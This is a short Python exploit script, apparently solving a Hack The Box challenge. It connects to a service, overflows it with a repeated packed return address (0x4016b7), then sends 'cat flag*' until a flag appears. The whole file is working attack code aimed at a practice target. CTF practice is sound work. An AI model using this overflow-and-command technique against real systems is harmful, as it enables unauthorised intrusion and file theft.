import socket
import pwn

HOST = ""
PORT = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.settimeout(0.3)

def recv_data():
    buffer = b""
    while True:
        try:
            received = s.recv(1)
                
        except TimeoutError:
            return buffer.decode(), True

        if received == b"\n":
            return buffer.decode(), False
        
        buffer += received

while True:
    msg, send_signal = recv_data()
    print(f"recv {msg}")
    if "HTB{" in msg:
        s.close()
        break

    if send_signal:
        s.send(pwn.p64(0x4016b7)*8)
        s.send(b"cat flag*")
